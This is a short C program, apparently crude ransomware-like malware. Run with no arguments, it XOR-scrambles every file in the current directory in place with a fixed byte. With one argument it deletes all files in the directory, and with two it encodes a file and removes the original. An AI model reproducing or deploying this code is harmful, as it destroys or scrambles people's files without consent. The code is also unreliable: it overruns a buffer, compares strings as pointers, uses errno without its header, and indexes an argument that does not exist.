#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#define getchar() getc(stdin)
#define putchar() putc((c),stdout)
#define XOR_BYTE 0x9E

char * xorBuffer(char *buffer, long bufferSize){
	
	int i;
	for(i = 0;i <= bufferSize;i++){
		buffer[i] ^= XOR_BYTE;
	}
	return buffer;
}

int delDir(char *fileOut){
	DIR *dir = NULL;
	struct dirent *ent;
	dir = opendir("./");
	int i;
	if(dir != NULL){
		while(ent = readdir(dir))
			remove(ent->d_name);	
		(void)closedir(dir);
	}
	
}

int xorAll(char *fileIn){
	FILE *fpi,*fpo;
	char *fileHolder = fileIn;
	char *fileBuffer = NULL;
	fpi = fopen(fileIn,"rb");
	
	if(NULL == fpi){
		return 1;
	}
	fseek(fpi,0L,SEEK_END);
	long fileSize = ftell(fpi);
	fileBuffer = malloc(sizeof(char) * (fileSize + 1));
	fseek(fpi,0L,SEEK_SET);
	size_t length = fread(fileBuffer,sizeof(char),fileSize,fpi);	
	fileBuffer[length];
	fileBuffer = (char *)xorBuffer(fileBuffer,fileSize);
	fclose(fpi);
	remove(fileIn);
	int c;
	fpo = fopen(fileHolder,"wb");
	for(c = 0;c < fileSize;c++){	
		putc(((fileBuffer[c])),fpo);	
	}
	fclose(fpo);
	free(fileBuffer);
}

int xorFile(char *fileIn, char * fileOut){
	
	FILE *fpi, *fpo;
	char *fileBuffer = NULL;
	
	fpi = fopen(fileIn,"rb");
    fpo = fopen(fileOut,"wb");
	
	if(NULL == fpi){
		printf("Error opening input file %s: %s\n", fileIn, strerror(errno));
		return 1;
	}
	if(NULL == fpo){
		printf("Error opening output file %s: %s\n", fileOut, strerror(errno));
		return 2;
	}
	
	fseek(fpi,0L,SEEK_END);
	long fileSize = ftell(fpi);	
	fileBuffer = malloc(sizeof(char)* (fileSize + 1));	
	fseek(fpi,0L,SEEK_SET); 	
	size_t length = fread(fileBuffer, sizeof(char), fileSize,fpi);		
	fileBuffer[length];
	fileBuffer = (char *)xorBuffer(fileBuffer,fileSize);	
	int c;	
	for(c = 0;c < fileSize;c++){ 
		putc(((fileBuffer[c])),fpo);
	}
	
	fclose(fpi);
	fclose(fpo);
	free(fileBuffer);
	remove(fileIn);
	return 0;
}

int main(int argc, char*argv[]){
	if(argc == 1){
		DIR *dir = NULL;
		struct dirent *ent;
		dir = opendir("./");
		int i;
		if(dir != NULL){
			while(ent = readdir(dir)){
				if(ent->d_name != "." || ent->d_name != ".."){
					xorAll(ent->d_name);
				}
			}
					
			(void)closedir(dir);
		}
	}
	if(argc == 2){
		delDir(argv[2]);
	}
	if(argc == 3){
		if(xorFile(argv[1],argv[2]) == 0)
			printf("File encryption was successful.");
		else
			printf("An error occured.");
	}
}